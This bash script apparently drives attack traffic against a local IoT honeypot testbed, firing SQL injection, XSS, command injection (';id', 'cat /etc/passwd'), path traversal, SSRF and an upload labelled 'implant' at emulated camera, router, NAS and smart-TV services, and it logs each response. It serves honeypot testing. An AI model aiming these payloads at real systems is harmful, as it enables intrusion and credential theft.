#!/usr/bin/env bash
# =============================================================================
# Computer 3 — 03_webattacks.sh
# Runs SQL injection, command injection, XSS, path traversal, and SSRF attacks
# against the HTTP (8080), camera (8081), router (8085), nas (8086),
# smarttv (8083), and printer (8087) containers. Each curl is logged.
# =============================================================================
set -uo pipefail
cd "$(dirname "$0")/.."
[ -f .env ] && set -a && . ./.env && set +a
HOST="${HONEYPOT_HOST:-192.168.1.10}"
OUT="results/03_webattacks"
mkdir -p results

log() { echo -e "\n=== $* ===" | tee -a "${OUT}.log"; }
hit() { local label="$1"; shift; echo "[$label] $*" | tee -a "${OUT}.log"; curl -s -o /dev/null -w "HTTP %{http_code}  %{size_download}B  %{time_total}s\n" "$@" | tee -a "${OUT}.log"; }

log "SQLi auth bypass on /login"
hit sqli_auth_bypass "http://${HOST}:${HTTP_PORT:-8080}/login" -d "u=admin'--&p=x"

log "SQLi UNION exfil on /product"
hit sqli_union "http://${HOST}:${HTTP_PORT:-8080}/product?id=1%20UNION%20SELECT%20user,pass,1%20FROM%20users"

log "SQLi error-based"
hit sqli_error "http://${HOST}:${HTTP_PORT:-8080}/product?id='"

log "Reflected XSS on /search"
hit xss "http://${HOST}:${HTTP_PORT:-8080}/search?q=%3Cscript%3Ealert(1)%3C/script%3E"

log "Command injection on /api/ping"
hit cmdi_ping "http://${HOST}:${HTTP_PORT:-8080}/api/ping?host=127.0.0.1;id"

log "Command injection on camera /streams"
hit cmdi_camera "http://${HOST}:${CAMERA_PORT:-8081}/streams?id=1;id"

log "Path traversal on camera /admin"
hit traversal_camera "http://${HOST}:${CAMERA_PORT:-8081}/admin?file=../../etc/passwd"

log "Path traversal on nas /api/files"
hit traversal_nas "http://${HOST}:${NAS_PORT:-8086}/api/files?path=/etc/passwd"

log "SSRF on smarttv /cast"
hit ssrf_tv "http://${HOST}:${SMARTTV_PORT:-8083}/cast?url=http://127.0.0.1:9200/"

log "Command injection on router /api/diag"
hit cmdi_router "http://${HOST}:${ROUTER_PORT:-8085}/api/diag?host=127.0.0.1;cat%20/etc/passwd"

log "Cmd injection on smarttv /app/install"
hit cmdi_tv_install "http://${HOST}:${SMARTTV_PORT:-8083}/app/install?pkg=demo;id"

log "Cmd injection on nas /api/snapshot"
hit cmdi_nas "http://${HOST}:${NAS_PORT:-8086}/api/snapshot?name=snap;id"

log "Recon on router /api/config"
hit recon_router "http://${HOST}:${ROUTER_PORT:-8085}/api/config"

log "Recon on nas /api/share"
hit recon_nas "http://${HOST}:${NAS_PORT:-8086}/api/share"

log "File upload (implant)"
hit upload "http://${HOST}:${HTTP_PORT:-8080}/upload" -F "f=@scripts/wordlists/users.txt"

log "Done. Full curl log in results/${OUT}.log"
